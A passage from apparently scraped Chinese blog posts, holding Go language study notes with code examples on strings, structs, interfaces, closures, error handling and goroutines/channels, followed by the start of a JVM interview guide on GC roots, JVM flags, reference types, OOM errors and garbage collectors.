fmt.Println(lengthOfSubString(&quot;abab&quot;)) fmt.Println(lengthOfSubString(&quot;abc&quot;)) fmt.Println(lengthOfSubString(&quot;abcabc&quot;))} 字符和字符串处理package mainimport &quot;fmt&quot;func runeTest() { s := &quot;cuzz是我!&quot; for i, b := range []byte(s) { fmt.Printf(&quot;(%d %X %c) &quot;, i, b, b) } fmt.Println() for i, u := range s { fmt.Printf(&quot;(%d %X %c) &quot;, i, u, u) } fmt.Println() for i, r := range []rune(s) { fmt.Printf(&quot;(%d %X %c) &quot;, i, r, r) } // 输出 // (0 63 c) (1 75 u) (2 7A z) (3 7A z) (4 E6 æ) (5 98 ) (6 AF ¯) (7 E6 æ) (8 88 ) (9 91 ) (10 21 !) // (0 63 c) (1 75 u) (2 7A z) (3 7A z) (4 662F 是) (7 6211 我) (10 21 !) // (0 63 c) (1 75 u) (2 7A z) (3 7A z) (4 662F 是) (5 6211 我) (6 21 !) // 说明 range s 使用的 utf-8 遍历, 但是观察下标发现不是连续的 // ascii 转为 utf-8 如:(4 E6) (5 98) (6 AF) -&gt; (4 662F) // 使用 []rune() 转换可以使下标连续输出}func main() { runeTest()} 面向对象 go 语言仅支持封装，不支持继承和多态 go 语言没有 class，只有 struct 结构体和方法package mainimport ( &quot;fmt&quot;)// 定义结构体, 小写对外不可见type treeNode struct { value int left, right *treeNode}// setter, 错误, 由于 go 是传值, 不会改变func (node treeNode) setVal(value int) { node.value = value}func (node *treeNode) setValue(value int) { node.value = value}// 给结构体定义方法 node.print()func (node treeNode) print() { fmt.Println(node.value)}// 普通的方法 print(node)func print(node treeNode) { fmt.Println(node.value)}// 定义一个工厂方法func createNode(value int) *treeNode { return &amp;treeNode{value: value}}// 遍历func (node *treeNode) traverse() { if node == nil { return } node.left.traverse() node.print() node.right.traverse()}func main() { // 定义一个空的结构体 var node treeNode fmt.Println(node) // {0 &lt;nil&gt; &lt;nil&gt;} // 使用构造器定义一个结构体 node2 := treeNode{ value: 1, left: &amp;treeNode{}, // 取地址 right: new(treeNode), // new() 获取的是地址 } fmt.Println(node2) // {1 0xc00000c0c0 0xc00000c0a0} // 使用工厂方法创建 node3 := treeNode{ value: 0, } node3.left = createNode(1) node3.right = createNode(2) fmt.Println(node3) // {0 0xc00008e0a0 0xc00008e0c0} // 区别 node.print() // 0 print(node) // 0 // 不会改变, go 是传值 node.setVal(1) node.print() // 0 // 会改变 node.setValue(1) node.print() // 1 fmt.Println() // 中顺遍历 0 // 1 2 node3.traverse() // 1 0 2} 包和封装 包 每个目录一个包 main 包包含可执行入口 为结构定义的方法必须放在同一包内 可以是不同的文件 封装 一般使用驼峰命名 首字母大写表示 public 首字母小写表示 private Queue.go package queueimport &quot;fmt&quot;type Queue []intfunc (q *Queue) Push(v int) { *q = append(*q, v)}func (q *Queue) Pop() int { head := (*q)[0] *q = (*q)[1:] return head}func (q *Queue) Head() int { return (*q)[0]}func (q *Queue) IsEmpty() bool { return len(*q) == 0}func (q *Queue) Print() { for _, v := range *q { fmt.Print(v, &quot; &quot;) } fmt.Println()} test.go package mainimport ( &quot;awesomeProject/queue&quot; &quot;fmt&quot;)func main() { // 定义一个有默认值的队列 q := queue.Queue{1} q.Push(2) q.Push(3) q.Push(4) q.Print() // 1 2 3 4 fmt.Println(q.Pop()) // 1 q.Print() // 2 3 4 q.Pop() q.Pop() q.Pop() fmt.Println(q.IsEmpty()) // true} 项目结构环境变量： GOROOT：go语言自带的类库 GOPATH：用户源代码目录 src：源文件 pkg：build 的之后的中间文件 bin：可执行文件 接口duck typing “像鸭子走路，像鸭子叫…”，那么就是鸭子 描述事物的外部行为而非内部结构 严格说 go 属于结构化类型系统，类似 duck typing 接口定义和实现定义一个假的发送请求，有一个 Get 方法 package mocktype Retriever struct { Contents string}func (r Retriever) Get(url string) string { return url + &quot;hi, cuzz...&quot;} 定义一个真正发送请求，有一个 Get 方法 package workimport ( &quot;net/http&quot; &quot;net/http/httputil&quot; &quot;time&quot;)type Retriever struct { UserAgent string TimeOut time.Duration}func (r Retriever) Get(url string) string { resp, err := http.Get(url) if err != nil { panic(err) } result, err := httputil.DumpResponse(resp, true) resp.Body.Close() if err != nil { panic(err) } return string(result)} 测试 package mainimport ( &quot;awesomego/retriever/mock&quot; &quot;awesomego/retriever/work&quot; &quot;fmt&quot;)// 定义一个接口type Retriever interface { Get(url string) string}// 传入接口func download(r Retriever) string { return r.Get(&quot;http://blog.cuzz.site&quot;)}func main() { // 接口定义 // var mockRetriever Retriever // mockRetriever = mock.Retriever{} mockRetriever := mock.Retriever{} fmt.Println(download(mockRetriever)) workRetriever := work.Retriever{} fmt.Println(download(workRetriever))} 我们发现在接口是调用放定义的，结构体中的接口也是隐式的，结构体满足接口中的方法，就可以说这个结构体实现了这个接口。 接口的值类型在golang中，接口值是由两部分组成的，一部分是接口的类型，另一部分是该类型对应的值，我们称其为动态类型和动态值。 func main() { mockRetriever := mock.Retriever{} fmt.Printf(&quot;%T, %v\\n&quot;, mockRetriever, mockRetriever) // mock.Retriever, {} workRetriever := work.Retriever{} fmt.Printf(&quot;%T, %v\\n&quot;, workRetriever, workRetriever) // work.Retriever, { 0s}} 接口组合package main// 定义一个接口type Retriever interface { Get(url string) string}// 定义另一个接口type Poster interface { Post(url string, params map[string]string)}// 接口组合type RetrieverAndPoster interface { Retriever Poster // 也可以定义其他方法 AnotherMethod()}func main() {} 常用系统接口1、Stringer Stringer接口中的 string 相当与 Java #toString 方法 package workimport ( &quot;fmt&quot; &quot;time&quot;)type Retriever struct { UserAgent string TimeOut time.Duration}func (r Retriever) String() string { return fmt.Sprintf(&quot;UserAgent: %v, TimeOut: %v&quot;, r.UserAgent, r.TimeOut)} 测试 package mainimport ( &quot;awesomego/retriever/work&quot; &quot;fmt&quot; &quot;time&quot;)func main() { workRetriever := work.Retriever{&quot;Mozilla/5.0&quot;, time.Minute} fmt.Println(workRetriever) // UserAgent: Mozilla/5.0, TimeOut: 1m0s} 2、Reader type Reader interface { Read(p []byte) (n int, err error)} 3、Writer type Writer interface { Write(p []byte) (n int, err error)} 函数式编程 函数是一等公民：参数，变量，返回值都可以是函数 高级函数 闭包 package mainimport &quot;fmt&quot;// 定义一个 adder 函数, 没有参数, 返回值是一个函数func adder() func(int) int { sum := 0 return func(v int) int { sum += v return sum }}// 定义斐波那契数列func fibonacci() func() int{ a, b := 0, 1 return func() int { a, b = b, a + b fmt.Println(a) return a }}func main() { a := adder() for i := 0; i &lt; 10; i++ { fmt.Printf(&quot;0 + 1 + ... + %d = %d\\n&quot;, i, a(i)) } f := fibonacci() f() // 1 f() // 1 f() // 2 f() // 3 f() // 5} 资源管理与出错处理defer 调用你可以在 Go 函数中添加多个defer语句，当函数执行到最后时，这些 defer 语句会按照逆序执行（即最后一个defer语句将最先执行），最后该函数返回。特别是当你在进行一些打开资源的操作时，遇到错误需要提前返回，在返回前你需要关闭相应的资源，不然很容易造成资源泄露等问题。如下代码所示，我们一般写打开一个资源是这样操作的： func CopyFile(dst, src string) (w int64, err error) { srcFile, err := os.Open(src) if err != nil { return } defer srcFile.Close() dstFile, err := os.Create(dst) if err != nil { return } defer dstFile.Close() return io.Copy(dstFile, srcFile)} 错误处理错误处理是任何语言都需要考虑到的问题，而 Go 语言在错误处理上解决得更为完善，优雅的错误处理机制是 Go 语言的一大特点。 1、error Go 语言引入了一个错误处理的标准模式，即error接口，该接口定义如下： type error interface { Error() string} 对于大多数函数，如果要返回错误，可以将error作为多返回值的最后一个： func foo(param int)(ret int, err error) { ... } 调用时的代码： n, err := foo(0)if err != nil { // 错误处理} else { // 使用返回值n} 2、panic 停止当前函数执行 一直向上返回，执行每一层的 defer 如果没有遇见 recover，程序退出 3、recover 仅在 defer 中调用 获取 panic 的值 如果无法处理，可以重新 panic package mainimport ( &quot;fmt&quot;)func tryRecover() { // 匿名函数里 defer func() { r := recover() if err, ok := r.(error); ok { fmt.Println(&quot;Error occurred: &quot;, err) } else { panic(fmt.Sprintf(&quot;I don't know what to do: %v&quot;, r)) } }() a := 1 b := 0 fmt.Println(a / b) // runtime error: integer divide by zero // panic(errors.New(&quot;this is an error&quot;)) // panic(123) // 如果不是一个错误的话就, 再次 panic 出去}func main() { tryRecover() } 并发编程goroutine1、协程 轻量级“线程” 非抢占式多任务处理，由协程主动交出控制权 编译器/解释器/虚拟器层面的多任务 多个协程可能在一个或者多个线程上运行 package mainimport ( &quot;fmt&quot; &quot;time&quot;)func test() { // 此时, 不会输出, main 先退出了, 必须让 main sleep for i := 0; i &lt; 1000; i++ { // 匿名函数 go func(i int) { for { fmt.Printf(&quot;From %d\\n&quot;, i) } }(i) } time.Sleep(time.Millisecond)}func test2() { // 此时不会退出, 因为不能交出控制权 var arr [10]int for i := 0; i &lt; 10; i++ { // 匿名函数 go func(i int) { arr[i]++ }(i) } time.Sleep(time.Millisecond)}func main() { test() test2()} 2、go 语言中的调度器 协程可以相互通信 channelchannel是goroutine之间互相通讯的东西。类似我们 Unix 上的管道（可以在进程间传递消息），用来goroutine之间发消息和接收消息。其实，就是在做goroutine之间的内存共享。channel是类型相关的，也就是说一个channel只能传递一种类型的值，这个类型需要在channel声明时指定。 package mainimport ( &quot;fmt&quot; &quot;time&quot;)// 定义chanfunc defineChan() { // 声名一个传递int型的channel // var a chan int // 初始化一个int型channel a := make(chan int) // 从channel中获取 go func() { for { z := &lt;-a fmt.Println(z) } }() a &lt;- 1 time.Sleep(time.Millisecond)}// 定义带缓存chanfunc bufChan() { // 初始化一个int型channel a := make(chan int, 3) // 从channel中获取 go func() { for { //z, ok := &lt;-a //if !ok { // break //} //fmt.Println(z) // 或者使用这种, 确保发送完成 for z := range a { fmt.Println(z) } } }() a &lt;- 1 a &lt;- 2 a &lt;- 3 a &lt;- 4 close(a) // 关闭了的话, 就一直发送0 time.Sleep(time.Millisecond)}// 如何使用func chanDemo() { // 定义一个只能收数据的channel, 把数据放到channel中 var channels [10]chan&lt;- int for i := 0; i &lt; len(channels); i++ { channels[i] = createWorker(i) } // 向channel中写数据 for i := 0; i &lt; len(channels); i++ { channels[i] &lt;- 'a' + i } time.Sleep(time.Millisecond)}func createWorker(i int) chan&lt;- int { c := make(chan int) go func() { for { fmt.Printf(&quot;Worker %d received %c\\n&quot;, i, &lt;-c) } }() return c}func main() { defineChan() bufChan() chanDemo()} 使用 Channel 等待任务结束package mainimport ( &quot;fmt&quot;)type worker struct { in chan int done chan bool // 使用done来通信确定完成}func chanDemo() { var channels [10]worker for i := 0; i &lt; len(channels); i++ { channels[i] = createWorker(i) } // 向channel中写数据 for i := 0; i &lt; len(channels); i++ { channels[i].in &lt;- 'a' + i &lt;-channels[i].done // 等待channel完成 }}func createWorker(i int) worker { w := worker{ in: make(chan int), done: make(chan bool), } go func() { for in := range w.in { fmt.Printf(&quot;Worker %d received %c\\n&quot;, i, in) w.done &lt;- true } }() return w}func main() { chanDemo()} 使用 select 进行调度package mainimport ( &quot;fmt&quot; &quot;math/rand&quot; &quot;time&quot;)func selectDemo() { var c1, c2 chan int c1, c2 = createChan(), createChan() for { select { case n := &lt;-c1: fmt.Printf(&quot;from c1, val: %d\\n&quot;, n) case n := &lt;-c2: fmt.Printf(&quot;from c2, val: %d\\n&quot;, n) } }}func createChan() chan int { out := make(chan int) go func() { i := 0 for { time.Sleep(time.Duration(rand.Intn(1000)) * time.Millisecond) i++ out &lt;- i } }() return out}func main() { selectDemo()}","link":"/2019/10/11/Go%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/"},{"title":"JVM 面试","text":"JVM 垃圾回收的时候如何确定垃圾？知道什么是 GC Roots ? 什么是垃圾 简单来说就是内存中已经不在被使用到的空间就是垃圾 要进行垃圾回收，如何判断一个对象是否可以被回收？ 引用计数法 枚举根节点做可达性分析 为了解决引用计数法的循环引用问题，Java 使用了可达性算法。 跟踪收集器采用的为集中式的管理方式，全局记录对象之间的引用状态，执行时从一些列GC Roots的对象做为起点，从这些节点向下开始进行搜索所有的引用链，当一个对象到GC Roots 没有任何引用链时，则证明此对象是不可用的。 图中，对象Object6、Object7、Object8虽然互相引用，但他们的GC Roots是不可到达的，所以它们将会被判定为是可回收的对象。 哪些对象可以作为 GC Roots 的对象： 虚拟机栈（栈帧中的局部变量区，也叫局部变量表）中引用的对象 方法区中的类静态属性引用的对象 方法去常量引用的对象 本地方法栈中 JNI (Native方法)引用的对象 你说你做过 JVM 调优和参数配置，请问如果盘点查看 JVM 系统默认值？JVM 的参数类型: 标配参数 -version -help X 参数（了解） -Xint：解释执行 -Xcomp：第一次使用就编译成本地代码 -Xmixed：混合模式 XX 参数 Boolean 类型：-XX：+ 或者 - 某个属性值（+ 表示开启，- 表示关闭） -XX:+PrintGCDetails：打印 GC 收集细节 -XX:-PrintGCDetails：不打印 GC 收集细节 -XX:+UseSerialGC：使用了串行收集器 -XX:-UseSerialGC：不使用了串行收集器 KV 设置类型：-XX:key=value -XX:MetaspaceSize=128m -XX:MaxTenuringThreshold=15 jinfo 举例，如何查看当前运行程序的配置 public class HelloGC { public static void main(String[] args) { System.out.println(&quot;hello GC...&quot;); try { Thread.sleep(Integer.MAX_VALUE); } catch (InterruptedException e) { e.printStackTrace(); } }} 我们可以使用 jps -l 命令，查出进程 id 1923 org.jetbrains.jps.cmdline.Launcher1988 sun.tools.jps.Jps1173 org.jetbrains.kotlin.daemon.KotlinCompileDaemon32077 com.intellij.idea.Main1933 com.cuzz.jvm.HelloGC32382 org.jetbrains.idea.maven.server.RemoteMavenServer 在使用 jinfo -flag PrintGCDetails 1933 命令查看 -XX:-PrintGCDetails 可以看出默认是不打印 GC 收集细节也可是使用jinfo -flags 1933 查看所以的参数 两个经典参数：-Xms 和 - Xmx（如 -Xms1024m） -Xms 等价于 -XX:InitialHeapSize -Xmx 等价于 -XX:MaxHeapSize 盘点家底查看 JVM 默认值 查看初始默认值：-XX:+PrintFlagsInitialcuzz@cuzz-pc:~/Project/demo$ java -XX:+PrintFlagsInitial[Global flags] intx ActiveProcessorCount = -1 {product} uintx AdaptiveSizeDecrementScaleFactor = 4 {product} uintx AdaptiveSizeMajorGCDecayTimeScale = 10 {product} uintx AdaptiveSizePausePolicy = 0 {product} uintx AdaptiveSizePolicyCollectionCostMargin = 50 {product} uintx AdaptiveSizePolicyInitializingSteps = 20 {product} uintx AdaptiveSizePolicyOutputInterval = 0 {product} uintx AdaptiveSizePolicyWeight = 10 {product} ... 查看修改更新：-XX:+PrintFlagsFinalbool UsePSAdaptiveSurvivorSizePolicy = true {product}bool UseParNewGC = false {product}bool UseParallelGC := true {product}bool UseParallelOldGC = true {product}bool UsePerfData = true {product}bool UsePopCountInstruction = true {product}bool UseRDPCForConstantTableBase = false {C2 product} = 与 := 的区别是，一个是默认，一个是人物改变或者 jvm 加载时改变的参数 打印命令行参数(可以看默认垃圾回收器)：-XX:+PrintCommandLineFlagscuzz@cuzz-pc:~/Project/demo$ java -XX:+PrintCommandLineFlags-XX:InitialHeapSize=128789376 -XX:MaxHeapSize=2060630016 -XX:+PrintCommandLineFlags -XX:+UseCompressedClassPointers -XX:+UseCompressedOops -XX:+UseParallelGC 你平时工作用过的 JVM 常用的基本配置参数有哪些？ -Xms 初始大小内存，默认为物理内存 1/64 等价于 -XX:InitialHeapSize -Xmx 最大分配内存，默认为物理内存的 1/4 等价于 -XX:MaxHeapSize -Xss 设置单个线程栈的大小，一般默认为 512-1024k 等价于 -XX:ThreadStackSize -Xmn 设置年轻代的大小 整个JVM内存大小=年轻代大小 + 年老代大小 + 持久代大小，持久代一般固定大小为64m，所以增大年轻代后，将会减小年老代大小。此值对系统性能影响较大，Sun官方推荐配置为整个堆的3/8。 -XX:MetaspaceSize 设置元空间大小（元空间的本质和永久代类似，都是对 JVM 规范中的方法区的实现，不过元空间于永久代之间最大区别在于，元空间并不在虚拟中，而是使用本地内存，因此默认情况下，元空间的大小仅受本地内存限制） 元空间默认比较小，我们可以调大一点 -XX:+PrintGCDetails 输出详细 GC 收集日志信息 设置 JVM 参数为： -Xms10m -Xmx10m -XX:+PrintGCDetails -XX:SurvivorRatio 设置新生代中 eden 和 S0/S1 空间比例 默认 -XX:SurvivorRatio=8，Eden : S0 : S1 = 8 : 1 : 1 -XX:NewRatio 配置年轻代和老年代在堆结构的占比 默认 -XX:NewRatio=2 新生代占1，老年代占2，年轻代占整个堆的 1/3 -XX:MaxTenuringThreshold 设置垃圾最大年龄 强引用、软引用、弱引用和虚引用分别是什么？在Java语言中，除了基本数据类型外，其他的都是指向各类对象的对象引用；Java中根据其生命周期的长短，将引用分为4类。 强引用 我们平常典型编码Object obj = new Object()中的 obj 就是强引用，通过关键字new创建的对象所关联的引用就是强引用。 当JVM内存空间不足，JVM宁愿抛出 OutOfMemoryError 运行时错误（OOM），使程序异常终止，也不会靠随意回收具有强引用的“存活”对象来解决内存不足的问题。 对于一个普通的对象，如果没有其他的引用关系，只要超过了引用的作用域或者显式地将相应强引用赋值为 null，就是可以被垃圾收集的了，具体回收时机还是要看垃圾收集策略。 软引用 软引用通过SoftReference类实现， 软引用的生命周期比强引用短一些。 只有当 JVM 认为内存不足时，才会去试图回收软引用指向的对象：即 JVM 会确保在抛出 OutOfMemoryError 之前，清理软引用指向的对象。 软引用可以和一个引用队列（ReferenceQueue）联合使用，如果软引用所引用的对象被垃圾回收器回收，Java虚拟机就会把这个软引用加入到与之关联的引用队列中。后续，我们可以调用ReferenceQueue的poll()方法来检查是否有它所关心的对象被回收。如果队列为空，将返回一个null，否则该方法返回队列中前面的一个Reference对象。 应用场景：软引用通常用来实现内存敏感的缓存。如果还有空闲内存，就可以暂时保留缓存，当内存不足时清理掉，这样就保证了使用缓存的同时，不会耗尽内存。 代码验证，我设置 JVM 参数为 -Xms10m -Xmx10m -XX:+PrintGCDetails public class SoftReferenceDemo { public static void main(String[] args) { Object obj = new Object(); SoftReference&lt;Object&gt; softReference = new SoftReference&lt;&gt;(obj); obj = null; try { // 分配 20 M byte[] bytes = new byte[20 * 1024 * 1024]; } catch (Exception e) { e.printStackTrace(); } finally { System.out.println(&quot;软引用：&quot; + softReference.get()); } }} 发现当内存不够的时候就会被回收。 [GC (Allocation Failure) [PSYoungGen: 1234K-&gt;448K(2560K)] 1234K-&gt;456K(9728K), 0.0016748 secs] [Times: user=0.00 sys=0.00, real=0.01 secs] [GC (Allocation Failure) [PSYoungGen: 448K-&gt;384K(2560K)] 456K-&gt;392K(9728K), 0.0018398 secs] [Times: user=0.01 sys=0.00, real=0.00 secs] [Full GC (Allocation Failure) [PSYoungGen: 384K-&gt;0K(2560K)] [ParOldGen: 8K-&gt;358K(7168K)] 392K-&gt;358K(9728K), [Metaspace: 3030K-&gt;3030K(1056768K)], 0.0057246 secs] [Times: user=0.01 sys=0.00, real=0.01 secs] [GC (Allocation Failure) [PSYoungGen: 0K-&gt;0K(2560K)] 358K-&gt;358K(9728K), 0.0006038 secs] [Times: user=0.00 sys=0.00, real=0.00 secs] [Full GC (Allocation Failure) [PSYoungGen: 0K-&gt;0K(2560K)] [ParOldGen: 358K-&gt;340K(7168K)] 358K-&gt;340K(9728K), [Metaspace: 3030K-&gt;3030K(1056768K)], 0.0115080 secs] [Times: user=0.01 sys=0.00, real=0.01 secs] 软引用：nullException in thread &quot;main&quot; java.lang.OutOfMemoryError: Java heap space at com.cuzz.jvm.SoftReferenceDemo.main(SoftReferenceDemo.java:21)Heap PSYoungGen total 2560K, used 98K [0x00000000ffd00000, 0x0000000100000000, 0x0000000100000000) eden space 2048K, 4% used [0x00000000ffd00000,0x00000000ffd18978,0x00000000fff00000) from space 512K, 0% used [0x00000000fff00000,0x00000000fff00000,0x00000000fff80000) to space 512K, 0% used [0x00000000fff80000,0x00000000fff80000,0x0000000100000000) ParOldGen total 7168K, used 340K [0x00000000ff600000, 0x00000000ffd00000, 0x00000000ffd00000) object space 7168K, 4% used [0x00000000ff600000,0x00000000ff6552f8,0x00000000ffd00000) Metaspace used 3067K, capacity 4496K, committed 4864K, reserved 1056768K class space used 336K, capacity 388K, committed 512K, reserved 1048576K 弱引用 弱引用通过 WeakReference 类实现， 弱引用的生命周期比软引用短。 在垃圾回收器线程扫描它所管辖的内存区域的过程中，一旦发现了具有弱引用的对象，不管当前内存空间足够与否，都会回收它的内存。由于垃圾回收器是一个优先级很低的线程，因此不一定会很快回收弱引用的对象。 弱引用可以和一个引用队列（ReferenceQueue）联合使用，如果弱引用所引用的对象被垃圾回收，Java虚拟机就会把这个弱引用加入到与之关联的引用队列中。 应用场景：弱应用同样可用于内存敏感的缓存。 代码验证 public class WeakReferenceDemo { public static void main(String[] args) { Object obj = new Object(); WeakReference&lt;Object&gt; weakReference = new WeakReference&lt;&gt;(obj); System.out.println(obj); System.out.println(weakReference.get()); obj = null; System.gc(); System.out.println(&quot;GC之后....&quot;); System.out.println(obj); System.out.println(weakReference.get()); }} 输出 java.lang.Object@1540e19djava.lang.Object@1540e19dGC之后....nullnull 引用队列 public class ReferenceQueueDemo { public static void main(String[] args) throws InterruptedException { Object obj = new Object(); ReferenceQueue&lt;Object&gt; referenceQueue = new ReferenceQueue&lt;&gt;(); WeakReference&lt;Object&gt; weakReference = new WeakReference&lt;&gt;(obj, referenceQueue); System.out.println(obj); System.out.println(weakReference.get()); System.out.println(weakReference); obj = null; System.gc(); Thread.sleep(500); System.out.println(&quot;GC之后....&quot;); System.out.println(obj); System.out.println(weakReference.get()); System.out.println(weakReference); }} 会把该对象的包装类即weakReference放入到ReferenceQueue里面，我们可以从queue中获取到相应的对象信息，同时进行额外的处理。比如反向操作，数据清理等。 java.lang.Object@1540e19djava.lang.Object@1540e19djava.lang.ref.WeakReference@677327b6GC之后....nullnulljava.lang.ref.WeakReference@677327b6 虚引用 虚引用也叫幻象引用，通过PhantomReference类来实现，无法通过虚引用访问对象的任何属性或函数。 幻象引用仅仅是提供了一种确保对象被 finalize 以后，做某些事情的机制。 如果一个对象仅持有虚引用，那么它就和没有任何引用一样，在任何时候都可能被垃圾回收器回收。 虚引用必须和引用队列 （ReferenceQueue）联合使用。当垃圾回收器准备回收一个对象时，如果发现它还有虚引用，就会在回收对象的内存之前，把这个虚引用加入到与之关联的引用队列中。 ReferenceQueue queue = new ReferenceQueue ();PhantomReference pr = new PhantomReference (object, queue); 程序可以通过判断引用队列中是否已经加入了虚引用，来了解被引用的对象是否将要被垃圾回收。如果程序发现某个虚引用已经被加入到引用队列，那么就可以在所引用的对象的内存被回收之前采取一些程序行动。 应用场景：可用来跟踪对象被垃圾回收器回收的活动，当一个虚引用关联的对象被垃圾收集器回收之前会收到一条系统通知。 请谈谈你对 OOM 的认识？ java.lang.StackOverflowError 在一个函数中调用自己就会产生这个错误 java.lang.OutOfMemoryError : Java heap space new 一个很大对象 java.lang.OutOfMemoryError : GC overhead limit exceeded 执行垃圾收集的时间比例太大， 有效的运算量太小，默认情况下,，如果GC花费的时间超过 **98%**， 并且GC回收的内存少于 **2%**， JVM就会抛出这个错误。 java.lang.OutOfMemoryError : Direct buffer memory配置参数：-Xms10m -Xmx10m -XX:+PrintGCDetails -XX:MaxDirectMemorySize=5m public class DirectBufferDemo { public static void main(String[] args) { System.out.println(&quot;maxDirectMemory : &quot; + sun.misc.VM.maxDirectMemory() / (1024 * 1024) + &quot;MB&quot;); ByteBuffer byteBuffer = ByteBuffer.allocateDirect(6 * 1024 * 1024); }} 输出 maxDirectMemory : 5MB[GC (System.gc()) [PSYoungGen: 1315K-&gt;464K(2560K)] 1315K-&gt;472K(9728K), 0.0008907 secs] [Times: user=0.00 sys=0.00, real=0.01 secs] [Full GC (System.gc()) [PSYoungGen: 464K-&gt;0K(2560K)] [ParOldGen: 8K-&gt;359K(7168K)] 472K-&gt;359K(9728K), [Metaspace: 3037K-&gt;3037K(1056768K)], 0.0060466 secs] [Times: user=0.01 sys=0.00, real=0.00 secs] Exception in thread &quot;main&quot; java.lang.OutOfMemoryError: Direct buffer memory at java.nio.Bits.reserveMemory(Bits.java:694) at java.nio.DirectByteBuffer.&lt;init&gt;(DirectByteBuffer.java:123) at java.nio.ByteBuffer.allocateDirect(ByteBuffer.java:311) at com.cuzz.jvm.DirectBufferDemo.main(DirectBufferDemo.java:17)Heap PSYoungGen total 2560K, used 56K [0x00000000ffd00000, 0x0000000100000000, 0x0000000100000000) eden space 2048K, 2% used [0x00000000ffd00000,0x00000000ffd0e170,0x00000000fff00000) from space 512K, 0% used [0x00000000fff00000,0x00000000fff00000,0x00000000fff80000) to space 512K, 0% used [0x00000000fff80000,0x00000000fff80000,0x0000000100000000) ParOldGen total 7168K, used 359K [0x00000000ff600000, 0x00000000ffd00000, 0x00000000ffd00000) object space 7168K, 5% used [0x00000000ff600000,0x00000000ff659e28,0x00000000ffd00000) Metaspace used 3068K, capacity 4496K, committed 4864K, reserved 1056768K class space used 336K, capacity 388K, committed 512K, reserved 1048576K java.lang.OutOfMemoryError : unable to create new native thread 创建线程数太多了 java.lang.OutOfMemoryError : Metaspace Java 8 之后的版本使用元空间（Metaspace）代替了永久代，元空间是方法区在 HotSpot 中的实现，它与持久代最大的区别是：元空间并不在虚拟机中的内存中而是使用本地内存。 元空间存放的信息： 虚拟机加载的类信息 常量池 静态变量 即时编译后的代码 具体的实现可以看看这个帖子：几种手动OOM的方式 GC 垃圾回收算法和垃圾收集器的关系？谈谈你的理解？ 四种 GC 垃圾回收算法 引用计数 复制回收 标记清除 标记整理 GC 算法是内存回收的方法论，垃圾收集其就是算法的落实的实现。 目前为止还没有完美的收集器的出现，更加没有万能的收集器，只是针对具体应用最适合的收集器，进行分代收集。 串行垃圾回收器（Serial） 它为单线程环境设计且只使用一个线程进行垃圾回收，会暂停所有的用户线程，所以不适合服务环境。 并行垃圾回收器（Parallel） 多个垃圾收集线程并行工作，此时用户线程是暂停的，用于科学计算、大数据处理等弱交互场景。 并发垃圾回收器（CMS） 用户线程和垃圾收集线程同时执行（不一定是并行，可能是交替执行），不需要停顿用户线程，互联网公司多用它，适用对相应时间有要求的场景。 G1 垃圾回收器 G1 垃圾回收器将堆内存分割成不同的区域然后并发的对其进行垃圾回收。 怎么查看服务器默认垃圾收集器是哪个？生产是如何配置垃圾收集器？谈谈你对垃圾收集器的理解？CMS你知道吗？ 怎么查看服务器默认垃圾收集器是哪个？ Java -XX:+PrintCommandLineFlags Java 的 GC 回收的类型主要有： UseSerialGC，UseParallelGC，UseConcMarkSweepGC，UseParNewGC，UseParallelOldGC，UseG1GC Java 8 以后基本不使用 Serial Old 垃圾收集器 参数说明 DefNew : Default New Generation Tenured : Old ParNew : Parallel New Generation PSYoungGen : Parallel Scavenge ParOldGen : Parallel Old Generation Server/Client 模式分别是什么意思 最主要的差别在于：-Server模式启动时，速度较慢，但是一旦运行起来后，性能将会有很大的提升。 当虚拟机运行在-client模式的时候，使用的是一个代号为C1的轻量级编译器, 而-server模式启动的虚拟机采用相对重量级，代号为C2的编译器，C2比C1编译器编译的相对彻底，服务起来之后,性能更高。 所以通常用于做服务器的时候我们用服务端模式，如果你的电脑只是运行一下java程序，就客户端模式就可以了。当然这些都是我们做程序优化程序才需要这些东西的，普通人并不关注这些专业的东西了。其实服务器模式即使编译更彻底，然后垃圾回收优化更好，这当然吃的内存要多点相对于客户端模式。 新生代 串行 GC (Serial/ Serital Copying) 并行 GC (ParNew) 并行回收 GC (Parallel/ Parallel Scanvenge) 老年代 串行 GC (Serial Old/ Serial MSC) 并行 GC (Parallel Old/ Parallel MSC) 并发标记清除 GC (CMS) 是一种以获取最短回收停顿时间为目标的收集器，适合应用在互联网站或者 B/S 系统的服务器上，这个类应用尤其重视服务器的响应速度，希望系统停顿时间最短。 CMS 非常适合堆内存大、CPU 核数多的服务器端应用，也是 G1 出现之前大型应用首选收集器。 并发停顿比较少，并发指的是与用户线程一起执行。 过程 初始标记（initail mark）：只是标记一下 GC Roots 能直接关联的对象，速度很快，需要暂停所有的工作线程 并发标记（concurrent mark 和用户线程一起）：进行 GC Roots 的跟踪过程，和用户线程一起工作，不需要暂停工作线程。 重新标记（remark）：为了修正在并发标记期间，因用户程序继续运行而导致标记产生变动的那一部分对象的标记记录，仍然需要暂停所有的工作线程。 并发清除（concurrent sweep 和用户线程一起）：清除 GC 不可达对象，和用户线程一起工作，不需要暂停工作线程，基于标记结果，直接清除。由于耗时最长的并发标记和并发清除过程中，垃圾收集线程和用户线程可以一起并发工作，所以总体来看 CMS 收集器的内存回收和用户线程是一起并发地执行。 优缺点 优点：并发收集停顿低 缺点：并发执行对 CPU 资源压力大，采用的标记清除算法会导致大量碎片 由于并发进行， CMS 在收集与应用线程会同时增加对堆内存的占用，也就是说，CMS 必须要在老年代堆用尽之前完成垃圾回收，否者 CMS 回收失败，将触发担保机制，串行老年代收集器将会以 STW 的方式进行一次 GC，从而造成较大的停顿时间。 标记清除算法无法整理空间碎片，老年代空间会随着应用时长被逐渐耗尽，最后将不得不通过担保机制对堆内存进行压缩。CMS 也提供了参数 -XX:CMSFullGCsBeForeCompaction (默认0，即每次都进行内存整理) 来指定多少次 CMS 收集之后，进行一次压 垃圾收集器配置代码总结，配置新生代收集器，老年代收集器会自动配置上。 如何选择垃圾收集器 单 CPU 或者小内存，单机程序：-XX:UseSerialGC 多 CPU 需要最大吞吐量，如后台计算型应用：-XX:UseParallelGC 或者 -XX:UseParallelOldGC 多 CPU 追求低停顿时间，需要快速响应，如互联网应用：-XX:+UseConcMarkSweepGC G1 垃圾收集器你了解吗？以前收集器的特点 年轻代和老年代是各自独立且连续的内存块 年轻代收集器使用 eden + S0 + S1 进行复制算法 老年代收集必须扫描整个老年代区域 都是以尽可能的少而快速地执行 GC 为设计原则 G1 是什么 G1 